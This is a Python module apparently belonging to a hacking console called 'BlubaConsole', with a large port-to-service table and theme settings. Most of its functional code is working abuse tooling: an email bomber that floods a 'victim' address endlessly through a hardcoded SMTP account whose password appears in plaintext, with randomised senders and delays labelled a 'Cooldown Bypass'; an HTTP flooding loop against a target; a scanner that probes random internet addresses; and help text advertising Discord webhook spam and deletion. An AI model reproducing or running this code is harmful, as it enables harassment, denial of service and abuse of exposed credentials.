from pystyle import System, Colors, Colorate, Write
from colorama import Fore, Style
import socket
import ping3
import requests
import random
import json
import datetime
import subprocess
import os
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorist import ColorRGB, BgColorRGB
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee
common_ports = {
    20: "FTP (Data)",
    21: "FTP (Control)",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    67: "DHCP (Server)",
    68: "DHCP (Client)",
    69: "TFTP",
    80: "HTTP",
    110: "POP3",
    115: "SFTP",
    123: "NTP",
    143: "IMAP",
    161: "SNMP",
    194: "IRC",
    389: "LDAP",
    443: "HTTPS",
    465: "SMTPS",
    514: "Syslog",
    636: "LDAPS",
    993: "IMAPS",
    995: "POP3S",
    1080: "SOCKS",
    1194: "OpenVPN",
    1433: "MSSQL",
    1521: "Oracle Database",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    8080: "HTTP (proxy)",
    8443: "HTTPS (alternative)",
    8888: "HTTP (alternative)",
    9418: "Git",
    9999: "Azure DevOps",
    10000: "Webmin",
    27017: "MongoDB",
    33060: "MySQL X Protocol",
    50000: "DB2",
    5433: "Greenplum Database",
    5984: "CouchDB",
    6379: "Redis",
    8000: "HTTP (alternative)",
    8081: "HTTP (alternative)",
    9000: "SonarQube",
    9042: "Cassandra",
    9200: "Elasticsearch",
    9990: "JBoss AS",
    11211: "Memcached",
    15672: "RabbitMQ (Management)",
    27015: "Source Engine RCON",
    27018: "Source Engine Query",
    28015: "Rust",
    32400: "Plex",
    3689: "iTunes",
    38989: "FrostWire",
    4000: "Rundeck",
    54321: "UniFi Controller",
    5500: "VNC (alternative)",
    5632: "PCAnywhere",
    5672: "AMQP",
    5800: "VNC over HTTP",
    5901: "VNC (alternative)",
    5989: "WBEM (HTTPS)",
    6000: "X11",
    6660: "Internet Relay Chat (IRC)",
    6667: "Internet Relay Chat (IRC) (alternative)",
    7001: "WebLogic Server",
    8001: "HTTP (alternative)",
    8082: "HTTP (alternative)",
    8444: "HTTPS (alternative)",
    8880: "HTTP (alternative)",
    9001: "Docker",
    9080: "WebSphere Application Server",
    9207: "Wireshark",
    9998: "Splunk",
    10001: "Squeezecenter",
    11210: "Memcached (alternative)",
    11235: "SIP (Session Initiation Protocol)",
    11280: "Kibana",
    12345: "NetBus",
    13720: "NetBackup",
    16080: "OSSEC",
    16161: "SolarWinds",
    16200: "Oracle WebLogic Server",
    17500: "ownCloud",
    19132: "Minecraft",
    20000: "Usermin",
    20547: "knetd",
    21025: "Realm of the Mad God",
    22222: "DirectAdmin",
    27000: "Half-Life Dedicated Server",
    3074: "Xbox Live",
    32768: "OMG (Object Management Group)",
    32769: "FileZilla Server",
    33389: "Skype",
    3784: "Ventrilo",
    40000: "SafetyNET p",
    43110: "ZeroNet",
    49152: "Windows RPC",
    49320: "IronPort",
    50020: "Hadoop",
    51413: "BitTorrent",
    5190: "AOL Instant Messenger",
    5514: "Net-SNMP",
    55555: "D-Link ShareCenter",
    5631: "PCAnywhere (alternative)",
    60020: "Hadoop",
    6370: "Hercules",
    6666: "Internet Relay Chat (IRC) (alternative)",
    7070: "Real Time Streaming Protocol (RTSP)",
    7288: "IBM iSeries",
    7777: "Oracle WebLogic Server (alternative)",
    8008: "HTTP (alternative)",
    8086: "InfluxDB",
    8333: "Bitcoin",
    8649: "Ganglia",
    8883: "MQTT",
    9415: "Allegro Network Multimeter",
    9875: "IBM WebSphere Admin Console",
    9876: "WebLogic Node Manager",
    9990: "JBoss Management",
    9997: "Splunk (alternative)",
    10050: "Zabbix Agent",
    11211: "Memcached (alternative)",
    11235: "SIP (Session Initiation Protocol) (alternative)",
    11720: "NetBackup (alternative)",
    12321: "Crossfire",
    12345: "NetBus (alternative)",
    13722: "NetBackup (alternative)",
    16080: "OSSEC (alternative)",
    16161: "SolarWinds (alternative)",
    16200: "Oracle WebLogic Server (alternative)",
    16992: "Intel AMT (Active Management Technology)",
    17500: "ownCloud (alternative)",
    19132: "Minecraft (alternative)",
    20000: "Usermin (alternative)",
    20547: "knetd (alternative)",
    21025: "Realm of the Mad God (alternative)",
    22222: "DirectAdmin (alternative)",
    27000: "Half-Life Dedicated Server (alternative)",
    3074: "Xbox Live (alternative)",
    32768: "OMG (Object Management Group) (alternative)",
    32769: "FileZilla Server (alternative)",
    33389: "Skype (alternative)",
    3784: "Ventrilo (alternative)",
    40000: "SafetyNET p (alternative)",
    43110: "ZeroNet (alternative)",
    49152: "Windows RPC (alternative)",
    49320: "IronPort (alternative)",
    50020: "Hadoop (alternative)",
    51413: "BitTorrent (alternative)",
    5190: "AOL Instant Messenger (alternative)",
    5514: "Net-SNMP (alternative)",
    55555: "D-Link ShareCenter (alternative)",
    5631: "PCAnywhere (alternative)",
    60020: "Hadoop (alternative)",
    6370: "Hercules (alternative)",
    6666: "Internet Relay Chat (IRC) (alternative)",
    7070: "Real Time Streaming Protocol (RTSP) (alternative)",
    7288: "IBM iSeries (alternative)",
    7777: "Oracle WebLogic Server (alternative)",
    8008: "HTTP (alternative)",
    8086: "InfluxDB (alternative)",
    8333: "Bitcoin (alternative)",
    8649: "Ganglia (alternative)",
    8883: "MQTT (alternative)",
    9415: "Allegro Network Multimeter (alternative)",
    9875: "IBM WebSphere Admin Console (alternative)",
    9876: "WebLogic Node Manager (alternative)",
    9990: "JBoss Management (alternative)",
    9997: "Splunk (alternative)",
    10050: "Zabbix Agent (alternative)",
}
cache = 'Tools/cache.json'
with open(cache, 'r') as file:
    data = json.load(file)
theme = data['Theme']
if theme == "1":
    red = Fore.RED
    lightred = Fore.LIGHTRED_EX
    green = Fore.GREEN
    pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
    lightblue = Fore.LIGHTBLUE_EX
    cyan = Fore.CYAN
    gray = Fore.LIGHTBLACK_EX + Fore.WHITE
    reset = Fore.RESET + Style.NORMAL
    pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
    dark = Style.DIM
    normal = Style.NORMAL
elif theme == "2":
    red = ColorRGB(165, 42, 255)
    lightred = ColorRGB(186, 90, 255)
    green = ColorRGB(113, 41, 255)
    pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
    lightblue = ColorRGB(92, 120, 255)
    cyan = ColorRGB(40, 185, 255)
    gray = Fore.LIGHTBLACK_EX + Fore.WHITE
    reset = Fore.RESET + Style.NORMAL
    pink = ColorRGB(94, 162, 255)
    dark = Style.DIM
    normal = Style.NORMAL


ct8smtphost = "s1.ct8.pl"
ct8smtpport = 587
ct8smtppass = "BlubaMailBomber23:6"
#{reset}{dark}╠═{normal}{pink}Project Github: {pretty}https://github.com/CNM-GCANP/BlubaConsole
def info():
    print(f"""
{reset}{dark}╔════[ {normal}{cyan}BlubaConsole{reset}{dark}]
{reset}{dark}╠═{normal}{pink}Author: {pretty}gigachadaniepizda1
{reset}{dark}╠═{normal}{pink}Github: {pretty}https://github.com/CNM-GCANP
{reset}{dark}╠═{normal}{pink}BIO: {pretty}https://guns.lol/nyga
{reset}{dark}╚════[ {normal}{cyan}BlubaConsole {reset}{dark}]
""")
    
def format_date(date):
    return date.strftime('%Y-%m-%d %H:%M:%S %Z') if date else "N/A"

def checkip(adres_ip):
    czas_odpowiedzi = ping3.ping(adres_ip)
    if czas_odpowiedzi is not None:
        return True
    else:
        return False
def help(w):
    if w == "all":
        print("""
ls - you know
cat/view - you know v2
exit - i think that stupid you aren't
bat - runs batch scripts
clear - clears console
clear cache - clears cache
theme 1/2 - sets theme
    """)
        help("ip")
        help("domain")
        help("web")
        help("discord")
    elif w == "ip":
        print("""
ip set <ip address/url> - change your target ip
ip check <ip address/url> - check ip
ip pinger - pings ip
ip nmap <all/common> - nmap scan
ip lan scan <port> - scans lan network for open port
    """)
    elif w == "domain":
        print("""
domain ip <domain> - get domain ip
domain whois <domain> - whois domain
    """)
    elif w == "web":
        print("""
web file download <url> <output file> - downloads file from url
web scan <wordlist> - something like gobuster (uses your cached ip)
web mail set <subject/body/victim> <arg> - sets information about bomber
web mail spam - starts email bomber
    """)
    elif w == "discord":
        print("""
discord webhook send <message> <webhook> - sends message to webhhok
discord webhook spam <message> <webhook> - spams message to webhhok
discord check <webhook> - checks if webhook is valid
discord delete <webhook> - deletes webhook
    """)
        
def getip(domain):
    temp = socket.gethostbyname(domain)
    return temp

def stress(ip):
    while True:
        result = requests.get("http://"+ip)
        print(result.status_code)
def scan_port(ip, port):
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not tcp.connect_ex((ip, port)):
            time_rn = get_time_rn()
            print(f'{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{green}+{reset}{dark}) {normal}{pretty}{port} > '+common_ports[port])
        tcp.close()
    except Exception:
        pass
def find(port):
    while True:
        ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
        ip = ".".join(ip_parts)
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(ip)
            if not tcp.connect_ex((ip, port)):
                print('[+] %s:%d/TCP Open' % (ip, port))
            tcp.close()
        except Exception as e:
            pass
def setJtheme(ip):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['Theme'] = ip
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
def setJip(ip):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['IP'] = ip
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
def setJbombersubject(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberSubject'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
def setJbomberbody(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberBody'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
def setJbombervictim(subject):
    cache = 'Tools/cache.json'
    with open(cache, 'r') as file:
        data = json.load(file)
    data['BomberVictim'] = subject
    with open(cache, 'w') as file:
        json.dump(data, file, indent=4)
        
def scan_ip(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = sock.connect_ex((ip, port))
    if result == 0:
        time_rn = get_time_rn()
        print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{green}+{reset}{dark}) {normal}{pretty}IP Found: {cyan}{ip}")
    else:
        return 0


def getsmtp(smtp):
    ct8smtpmails = [
        "2456@mailbomberblub.ct8.pl",
        "5678@mailbomberblub.ct8.pl",
        "2345@mailbomberblub.ct8.pl",
        "9843@mailbomberblub.ct8.pl",
        "8365@mailbomberblub.ct8.pl",
        "9475@mailbomberblub.ct8.pl",
        "0164@mailbomberblub.ct8.pl",
        "5713@mailbomberblub.ct8.pl",
        "9465@mailbomberblub.ct8.pl",
        "4366@mailbomberblub.ct8.pl",
        "6642@mailbomberblub.ct8.pl",
        "6356@mailbomberblub.ct8.pl",
        "7435@mailbomberblub.ct8.pl",
        "0375@mailbomberblub.ct8.pl",
        "9456@mailbomberblub.ct8.pl",
        "2464@mailbomberblub.ct8.pl"
    ]
    if int(smtp) == 1:
        mail = random.choice(ct8smtpmails)
        return mail
def spammail(bombervictim, bombersubject, bomberbody):
    try:
        while True:
            smtp = random.randint(1,1)
            if smtp == 1:
                host = "s1.ct8.pl"
                smport = 587
                password = "BlubaMailBomber23:6"
                frommail = "FilipRewaj" + str(random.randint(1, 1000)) + "@mailbomberblub.ct8.pl"
                mail = getsmtp(smtp)
            message = MIMEMultipart()
            message["From"] = frommail
            message["To"] = bombervictim
            message["Subject"] = bombersubject
            message.attach(MIMEText(bomberbody, "plain"))
            server = smtplib.SMTP(host, smport)
            server.starttls()
            server.login(mail, password)
            try:
                server.sendmail(frommail, bombervictim, message.as_string())
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Message Sended {gray}| {green}{smtp}")
            except Exception as e:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Error {gray}| {str(e)}")
            except KeyboardInterrupt:
                print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
            finally:
                server.quit()
            t = random.randint(1,9)
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pink}Waiting {t} seconds (Cooldown Bypass)")
            time.sleep(t)
    except KeyboardInterrupt:
        print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
